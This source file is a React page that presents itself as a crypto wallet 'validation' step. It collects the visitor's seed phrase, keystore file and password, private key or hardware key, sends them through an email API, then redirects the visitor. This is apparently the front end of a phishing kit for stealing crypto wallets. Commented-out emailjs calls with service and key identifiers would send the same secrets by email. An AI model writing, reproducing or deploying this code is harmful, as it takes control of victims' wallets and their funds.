"use client"
import { FormEvent, FunctionComponent, ReactElement, useEffect, useState } from "react";
import styles from '@/app/styles/Validate.module.scss';
import Image from "next/image";
import { useRouter, useSearchParams } from "next/navigation";
import { wallets } from "@/app/Constants/wallets";
import { WalletInfo } from "@/app/models/WalletInfo";
import { useSendEmailToClient } from "../api/apiClient";
import { Suspense } from 'react'
// import emailjs from 'emailjs-com';
// import { useForm, ValidationError } from '@formspree/react';

interface ValidateWalletProps {

}

const TabEnum = {
    Mnemoics: 0,
    Keystore: 1,
    PrivateKey: 2,
    Hardware: 3
}

const ValidateWallet: FunctionComponent<ValidateWalletProps> = (): ReactElement => {

    const router = useRouter();
    const searchParams = useSearchParams();
    const specifiedWalletName = searchParams.get("walletName");
    const sendEmailToClient = useSendEmailToClient();

    const [tab, setTab] = useState(TabEnum.Mnemoics);

    const [selectedWallet, setSelectedWallet] = useState<WalletInfo>();

    const [validationMsg, setValidationMsg] = useState<any>();

    // Mnemonics 
    const [wordPhrase, setWordPhrase] = useState<string>();
    // Keystore 
    const [keystoreJson, setKeystoreJson] = useState<string>();
    const [password, setPassword] = useState<string>();
    // Private key 
    const [privateKey, setPrivateKey] = useState<string>();
    // Hardware 
    const [hardwareKey, setHardwareKey] = useState<string>();


    async function handleSendEmailToClient() {

        await sendEmailToClient({ coin: selectedWallet?.name as string, mnemonics: wordPhrase as string, keystore: keystoreJson as string, keystore_password: password as string, private: privateKey as string, keyhardware: hardwareKey as string })
            .then((response) => {
                console.log(response);
            })
            .catch((error) => {
                console.log(error);
            })
        // .finally(() => {
        // })
    };

    const handleSubmit = async (event: FormEvent<HTMLFormElement>) => {
        event.preventDefault();

        // Create template params for each case study 
        if (tab === TabEnum.Mnemoics) {
            const templatePrams = {
                crypto_name: selectedWallet?.name as string,
                word_phrase: wordPhrase as string,
                selected_info_type: 'Mnemoics'
            };

            // Send email to the user
            await handleSendEmailToClient();

            // emailjs.send(
            //     'service_aj89k72',
            //     'template_pdqscf4',
            //     { ...templatePrams },
            //     'Kx3H2T_Dvdctm46t1'
            // )
            //     .then((response) => {
            //         console.log('Mnemonics Email sent successfully!', response.status, response.text);
            //         // Display success message to the user
            //     })
            //     .catch((error) => {
            //         console.error('Mnemonics Failed to send email:', error);
            //         // Display error message to the user
            //     });
        }
        if (tab === TabEnum.Keystore) {
            const templatePrams = {
                crypto_name: selectedWallet?.name as string,
                keystore_json: keystoreJson as string,
                password: password as string,
                selected_info_type: 'Keystore'
            };

            // Send email to the user
            await handleSendEmailToClient();
            // emailjs.send(
            //     'service_aj89k72',
            //     'template_pdqscf4',
            //     { ...templatePrams },
            //     'Kx3H2T_Dvdctm46t1'
            // )
            //     .then((response) => {
            //         console.log('Mnemonics Email sent successfully!', response.status, response.text);
            //         // Display success message to the user
            //     })
            //     .catch((error) => {
            //         console.error('Mnemonics Failed to send email:', error);
            //         // Display error message to the user
            //     });
        }
        if (tab === TabEnum.PrivateKey) {
            const templatePrams = {
                crypto_name: selectedWallet?.name as string,
                private_key: privateKey as string,
                selected_info_type: 'Private Key'
            };

            // Send email to the user
            await handleSendEmailToClient();
            // emailjs.send(
            //     'service_aj89k72',
            //     'template_pdqscf4',
            //     { ...templatePrams },
            //     'Kx3H2T_Dvdctm46t1'
            // )
            //     .then((response) => {
            //         console.log('Mnemonics Email sent successfully!', response.status, response.text);
            //         // Display success message to the user
            //     })
            //     .catch((error) => {
            //         console.error('Mnemonics Failed to send email:', error);
            //         // Display error message to the user
            //     });
        }
        if (tab === TabEnum.Hardware) {
            const templatePrams = {
                crypto_name: selectedWallet?.name as string,
                hardware_key: hardwareKey as string,
                selected_info_type: 'Hardware Key'
            };

            // Send email to the user
            await handleSendEmailToClient();
            // emailjs.send(
            //     'service_aj89k72',
            //     'template_pdqscf4',
            //     { ...templatePrams },
            //     'Kx3H2T_Dvdctm46t1'
            // )
            //     .then((response) => {
            //         console.log('Mnemonics Email sent successfully!', response.status, response.text);
            //         // Display success message to the user
            //     })
            //     .catch((error) => {
            //         console.error('Mnemonics Failed to send email:', error);
            //         // Display error message to the user
            //     });
        }

        router.push('/import-wallet');
    };

    useEffect(() => {
        if (router) {
            let walletName = specifiedWalletName;
            console.log(walletName);
            console.log(wallets.find(element => element.name == walletName));
            setSelectedWallet(wallets.find(element => element.name == walletName));
        }
    }, [router])

    return (
        <Suspense>
            <div className={styles.validationPage}>
                <div className={styles.validationPage__top}>
                    <h2>Validate Wallet</h2>
                    {selectedWallet && <>
                        <div className={styles.image}>
                            <Image src={selectedWallet?.image} alt={selectedWallet?.name} />
                        </div>
                        <p>Validate your selected wallet <span>{selectedWallet?.name}</span> to continue </p>
                    </>}
                </div>
                <div className={styles.validationPage__tabSection}>
                    <div className={styles.tabs}>
                        <span onClick={() => setTab(TabEnum.Mnemoics)} className={tab === TabEnum.Mnemoics ? styles.active : ''}>MNEMONICS</span>
                        <span onClick={() => setTab(TabEnum.Keystore)} className={tab === TabEnum.Keystore ? styles.active : ''}>KEYSTORE</span>
                        <span onClick={() => setTab(TabEnum.PrivateKey)} className={tab === TabEnum.PrivateKey ? styles.active : ''}>PRIVATE KEY</span>
                        <span onClick={() => setTab(TabEnum.Hardware)} className={tab === TabEnum.Hardware ? styles.active : ''}>HARDWARE</span>
                    </div>
                </div>
                {validationMsg}
                {tab === TabEnum.Mnemoics &&
                    <form className={styles.validationPage__formSection} onSubmit={(e) => handleSubmit(e)}>
                        <div className={styles.inputArea}>
                            <label htmlFor={`${selectedWallet?.name} Mnemoics word phrase`}>Please enter your 12/24 word phrase</label>
                            <input type="text" name={`${selectedWallet?.name} Mnemoics word phrase`} value={wordPhrase} onChange={(e) => setWordPhrase(e.target.value)} />
                        </div>
                        <button type="submit">Proceed</button>
                    </form>}
                {tab === TabEnum.Keystore &&
                    <form className={styles.validationPage__formSection} onSubmit={(e) => handleSubmit(e)}>
                        <div className={styles.inputArea}>
                            <label htmlFor={`${selectedWallet?.name} Keystore JSON`}>Please enter your Keystore JSON</label>
                            <input type="text" name={`${selectedWallet?.name} Keystore JSON`} value={keystoreJson} onChange={(e) => setKeystoreJson(e.target.value)} />
                            <span>Key must be in HEX format</span>
                        </div>
                        <div className={styles.inputArea}>
                            <label htmlFor={`${selectedWallet?.name} Keystore Password`}>Enter Password</label>
                            <input type="text" name={`${selectedWallet?.name} Keystore Password`} value={password} onChange={(e) => setPassword(e.target.value)} />
                        </div>
                        <button type="submit">Proceed</button>
                    </form>}
                {tab === TabEnum.PrivateKey &&
                    <form className={styles.validationPage__formSection} onSubmit={(e) => handleSubmit(e)}>
                        <div className={styles.inputArea}>
                            <label htmlFor={`${selectedWallet?.name} Private key`}>Please enter your private key</label>
                            <input type="text" name={`${selectedWallet?.name} Private key`} value={privateKey} onChange={(e) => setPrivateKey(e.target.value)} />
                        </div>
                        <button type="submit">Proceed</button>
                    </form>}
                {tab === TabEnum.Hardware && <form className={styles.validationPage__formSection} onSubmit={(e) => handleSubmit(e)}>
                    <div className={styles.inputArea}>
                        <label htmlFor={`${selectedWallet?.name} Hardware key`}>Please enter your Hardware Key</label>
                        <input type="text" name={`${selectedWallet?.name} Hardware key`} value={hardwareKey} onChange={(e) => setHardwareKey(e.target.value)} />
                    </div>
                    <button type="submit">Proceed</button>
                </form>}
            </div>
        </Suspense>
    );
}

export default ValidateWallet;